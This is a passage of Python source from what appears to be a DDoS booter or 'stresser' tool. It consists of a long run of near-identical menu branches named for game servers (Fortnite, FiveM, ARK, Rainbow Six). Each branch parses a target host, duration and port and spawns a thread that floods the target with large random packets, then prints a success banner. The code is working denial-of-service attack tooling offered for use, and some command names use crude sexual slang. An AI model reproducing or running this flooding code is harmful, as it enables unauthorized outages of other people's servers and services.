					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitev2":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortniterape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitebypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortniteslump":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitev1":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitestresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "r6kill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "arklift":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "arkdown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemkill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemdown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemrape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivembypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemv1":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemv2":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
